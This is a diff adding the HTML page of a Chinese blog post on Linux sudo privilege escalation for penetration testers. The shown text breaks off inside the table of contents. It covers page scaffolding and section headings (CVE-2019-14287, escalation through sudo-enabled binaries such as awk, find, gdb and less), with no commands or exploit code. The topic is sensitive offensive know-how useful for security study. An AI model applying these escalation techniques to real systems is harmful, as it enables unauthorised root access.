@@ -1,0 +1,542 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="伊卡洛维奇"><meta name="copyright" content="伊卡洛维奇"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>linux sudo提权 | Ikalovic@Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"lunereal.1kal0vic.top","root":"/","title":"kawayi","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="在进行渗透测试获取初始立足点的shell后，通常会运行sudo -l查看当前用户的权限，可通过系统已有可执行文件的权限实现提权。提权的本质就是低权限的用户因为某种特殊的配置&#x2F;漏洞，可利用具有高权限的指令&#x2F;工具&#x2F;脚本等执行高权限的操作。有关Linux系统的提权方法有很多，包含passwd或shadow文件利用提权、自动任务提权、SUID提权、内核漏洞提权、第三方工具提权、sudo提权等等，本文将详解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux sudo提权">
+<meta property="og:url" content="http://lunereal.1kal0vic.top/2025/11/29/Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Ikalovic@Hexo">
+<meta property="og:description" content="在进行渗透测试获取初始立足点的shell后，通常会运行sudo -l查看当前用户的权限，可通过系统已有可执行文件的权限实现提权。提权的本质就是低权限的用户因为某种特殊的配置&#x2F;漏洞，可利用具有高权限的指令&#x2F;工具&#x2F;脚本等执行高权限的操作。有关Linux系统的提权方法有很多，包含passwd或shadow文件利用提权、自动任务提权、SUID提权、内核漏洞提权、第三方工具提权、sudo提权等等，本文将详解">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-29T09:46:23.000Z">
+<meta property="article:modified_time" content="2025-11-29T02:48:44.844Z">
+<meta property="article:author" content="伊卡洛维奇">
+<meta property="article:tag" content="-web">
+<meta name="twitter:card" content="summary"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="伊卡洛维奇"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="伊卡洛维奇"><span class="site-author-status" title="loli赛高">☺️</span></a><div class="site-author-name"><a href="/about/">伊卡洛维奇</a></div><span class="site-name">Ikalovic@Hexo</span><sub class="site-subtitle">kawayi</sub><div class="site-description">loli赛高</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/girls/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:women-line"></span></span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Ikalovic" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/327357699" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">1.</span> <span class="toc-text">查看当前权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%BD%91%E7%AB%99"><span class="toc-number">2.</span> <span class="toc-text">资源网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-14287"><span class="toc-number">3.</span> <span class="toc-text">CVE-2019-14287</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-apt%E5%92%8Csudo-apt-get"><span class="toc-number">4.</span> <span class="toc-text">sudo apt和sudo apt-get</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-1"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C-1"><span class="toc-number">4.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-apache2"><span class="toc-number">5.</span> <span class="toc-text">sudo apache2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-2"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-ash"><span class="toc-number">6.</span> <span class="toc-text">sudo ash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-3"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-1"><span class="toc-number">6.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-awk"><span class="toc-number">7.</span> <span class="toc-text">sudo awk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-4"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-2"><span class="toc-number">7.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-base32-58-64-nc-z"><span class="toc-number">8.</span> <span class="toc-text">sudo base32&#x2F;58&#x2F;64&#x2F;nc&#x2F;z</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-5"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-3"><span class="toc-number">8.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-cp"><span class="toc-number">9.</span> <span class="toc-text">sudo cp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-6"><span class="toc-number">9.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-4"><span class="toc-number">9.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-cpulimit"><span class="toc-number">10.</span> <span class="toc-text">sudo cpulimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-7"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C-2"><span class="toc-number">10.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-curl"><span class="toc-number">11.</span> <span class="toc-text">sudo curl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-8"><span class="toc-number">11.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-5"><span class="toc-number">11.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-date"><span class="toc-number">12.</span> <span class="toc-text">sudo date</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-9"><span class="toc-number">12.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-6"><span class="toc-number">12.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-dd"><span class="toc-number">13.</span> <span class="toc-text">sudo dd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-10"><span class="toc-number">13.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-7"><span class="toc-number">13.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-dstat"><span class="toc-number">14.</span> <span class="toc-text">sudo dstat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-11"><span class="toc-number">14.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C-3"><span class="toc-number">14.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-ed"><span class="toc-number">15.</span> <span class="toc-text">sudo ed</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-12"><span class="toc-number">15.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C-4"><span class="toc-number">15.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-env"><span class="toc-number">16.</span> <span class="toc-text">sudo env</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-13"><span class="toc-number">16.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C-5"><span class="toc-number">16.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-exiftools"><span class="toc-number">17.</span> <span class="toc-text">sudo exiftools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-14"><span class="toc-number">17.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C-6"><span class="toc-number">17.2.</span> <span class="toc-text">提权操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-expect"><span class="toc-number">18.</span> <span class="toc-text">sudo expect</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-15"><span class="toc-number">18.1.</span> <span class="toc-text">漏洞利用前提</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-fail2ban"><span class="toc-number">19.</span> <span class="toc-text">sudo fail2ban</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-8"><span class="toc-number">19.1.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-find"><span class="toc-number">20.</span> <span class="toc-text">sudo find</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-16"><span class="toc-number">20.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-9"><span class="toc-number">20.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-flock"><span class="toc-number">21.</span> <span class="toc-text">sudo flock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-17"><span class="toc-number">21.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-10"><span class="toc-number">21.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-ftp"><span class="toc-number">22.</span> <span class="toc-text">sudo ftp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-18"><span class="toc-number">22.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-11"><span class="toc-number">22.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-gcc"><span class="toc-number">23.</span> <span class="toc-text">sudo gcc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-19"><span class="toc-number">23.1.</span> <span class="toc-text">漏洞利用前提</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-gdb"><span class="toc-number">24.</span> <span class="toc-text">sudo gdb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-12"><span class="toc-number">24.1.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-git"><span class="toc-number">25.</span> <span class="toc-text">sudo git</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-20"><span class="toc-number">25.1.</span> <span class="toc-text">漏洞利用前提</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-gzip-gunzip"><span class="toc-number">26.</span> <span class="toc-text">sudo gzip&#x2F;gunzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-21"><span class="toc-number">26.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-13"><span class="toc-number">26.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-iftop"><span class="toc-number">27.</span> <span class="toc-text">sudo iftop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-22"><span class="toc-number">27.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-14"><span class="toc-number">27.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-hping3"><span class="toc-number">28.</span> <span class="toc-text">sudo hping3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-23"><span class="toc-number">28.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-15"><span class="toc-number">28.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-java"><span class="toc-number">29.</span> <span class="toc-text">sudo java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-24"><span class="toc-number">29.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-16"><span class="toc-number">29.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-jjs"><span class="toc-number">30.</span> <span class="toc-text">sudo jjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-25"><span class="toc-number">30.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-17"><span class="toc-number">30.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-journalctl"><span class="toc-number">31.</span> <span class="toc-text">sudo journalctl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-26"><span class="toc-number">31.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-18"><span class="toc-number">31.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-knife"><span class="toc-number">32.</span> <span class="toc-text">sudo knife</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-27"><span class="toc-number">32.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-19"><span class="toc-number">32.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-less"><span class="toc-number">33.</span> <span class="toc-text">sudo less</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-28"><span class="toc-number">33.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-20"><span class="toc-number">33.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-man"><span class="toc-number">34.</span> <span class="toc-text">sudo man</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-29"><span class="toc-number">34.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-21"><span class="toc-number">34.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-more"><span class="toc-number">35.</span> <span class="toc-text">sudo more</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-30"><span class="toc-number">35.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-22"><span class="toc-number">35.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-mount"><span class="toc-number">36.</span> <span class="toc-text">sudo mount</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-31"><span class="toc-number">36.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-23"><span class="toc-number">36.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-mysql"><span class="toc-number">37.</span> <span class="toc-text">sudo mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-32"><span class="toc-number">37.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-24"><span class="toc-number">37.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-nano"><span class="toc-number">38.</span> <span class="toc-text">sudo nano</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-33"><span class="toc-number">38.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-25"><span class="toc-number">38.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-neofetch"><span class="toc-number">39.</span> <span class="toc-text">sudo neofetch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-34"><span class="toc-number">39.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-26"><span class="toc-number">39.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-nice"><span class="toc-number">40.</span> <span class="toc-text">sudo nice</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-35"><span class="toc-number">40.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-27"><span class="toc-number">40.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-nmap"><span class="toc-number">41.</span> <span 